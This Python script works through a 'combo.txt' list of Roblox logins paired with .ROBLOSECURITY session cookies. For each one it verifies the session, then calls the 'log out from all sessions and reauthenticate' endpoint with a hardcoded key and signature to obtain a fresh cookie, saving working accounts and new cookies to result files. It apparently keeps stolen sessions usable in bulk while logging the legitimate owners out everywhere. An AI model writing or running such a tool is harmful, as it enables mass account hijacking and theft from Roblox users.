import requests
import html
import time
from urllib.parse import unquote


class RobloxHelper:
    def __init__(self, cookie):
        self.session = requests.Session()
        self.cookie = cookie
        self.session.headers.update({
            'Cookie': f'.ROBLOSECURITY={self.cookie}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Referer' : 'https://www.roblox.com/'
        })
        self.csrf_token = None

    def get_csrf(self):
        response = self.session.get("https://www.roblox.com/home")
        
        value_csrf = html.unescape(response.text.split('"csrf-token" data-token="')[1].split('"')[0])
        value_csrf = unquote(value_csrf)
        self.csrf_token =  value_csrf
        self.session.headers["x-csrf-token"] = self.csrf_token

    def get_authenticated_user(self , phase):
        try:
            url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.session.get(url)
            
            if response.status_code == 200:
                user_data = response.json()
                user_id = user_data.get('id')
                return user_id
            else:
                return None
        except:
            return None

    def refresh_cookies(self):
        try:
            self.session.headers["authority"] = "apis.roblox.com"
            response = self.session.get(
                "https://apis.roblox.com/hba-service/v1/getServerNonce"
            )
            self.serverNonce = response.text.split('"')[1]
            self.session.headers["authority"] = "auth.roblox.com"
            json_data = {
                "secureAuthenticationIntent": {
                    "clientPublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEWh5du1vp9If72PPvqEGvNnlDhIduqx5lGTbqDVW3C2giiKH",
                    "clientEpochTimestamp": str(time.time()).split(".")[0],
                    "serverNonce": self.serverNonce,
                    "saiSignature": "mXSThi3U3gjW4BUvQbd/wA30JyYekQrNqCILXOmp3MOwAMvZB7J4FyBwV3rXfpLRDU6QMFf64Z4RyWR8tgOkoA==",
                },
            }

            response = self.session.post(
                "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate", json=json_data
            )
            
            try:
                cookies = response.cookies[".ROBLOSECURITY"]
            except:
                cookies = 'FALSE'

            return cookies
        except:
            return 'FALSE'

def process_cookies(file_path, success_path, false_path, newPathCookies):
    with open(file_path, 'r') as file, \
        open(success_path, 'w') as success_out, \
        open(newPathCookies, 'w') as new_cookies, \
        open(false_path, 'w') as false_out:
        for line in file:
            if line.strip():
                parts = line.strip().split(':_|', 1)  # Split only once
                if len(parts) > 1:
                    parts2 = parts[0]
                    idLogin = parts2.split(':')[0]
                    cookies = ('_|' + parts[1])
                    print(f'*******************************************************')
                    print(f'  REFRESH COOKIES ID : {idLogin}')
                    helper = RobloxHelper(cookies)
                    try:
                        helper.get_csrf()  # Retrieve and set the CSRF token
                    except:
                        print(f'  GET AUTHEN FAILED BEFORE REFRESH COOKIES : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue
                    user_id_before = helper.get_authenticated_user('OLD')
                    if not user_id_before:
                        print(f'  GET AUTHEN FAILED BEFORE REFRESH COOKIES : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue

                    print(f'  WILL REFRESH COOKIES : {idLogin}')
                    newCookie = helper.refresh_cookies()

                    if newCookie == 'FALSE':
                        print(f'  CANT REFRESH COOKIES ID : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue
                    
                    newHelper = RobloxHelper(newCookie)
                    try:
                        newHelper.get_csrf()
                    except:
                        print(f'  NEED TO VALIDATE NEW PASSWORD ID : {idLogin}')
                        false_out.write(f'{parts2}' + '\n')
                        continue
                    user_id = newHelper.get_authenticated_user('NEW')
                    if user_id:
                        print(f'  SUCCESS! ID : {idLogin}')
                        newLine = f'{parts2}:{newCookie}'
                        new_cookies.write(newCookie.strip() + '\n')
                        success_out.write(newLine.strip() + '\n')
                    else:
                        print(f'  GET AUTHEN FAILED AFTER REFRESH COOKIES : {idLogin}')
                        false_out.write(f'{parts2}' + '\n')
                        false_out.write(line.strip() + '\n')

# Main function
def main():
    file_path = 'combo.txt'  # Path to the file containing the cookies
    success_path = 'result/refresh_success.txt'
    newPathCookies = 'result/refresh_new_cookies.txt'
    false_path = 'result/refresh_failed.txt'
    process_cookies(file_path, success_path, false_path, newPathCookies)
    print(f'*******************************************************')

if __name__ == '__main__':
    main()
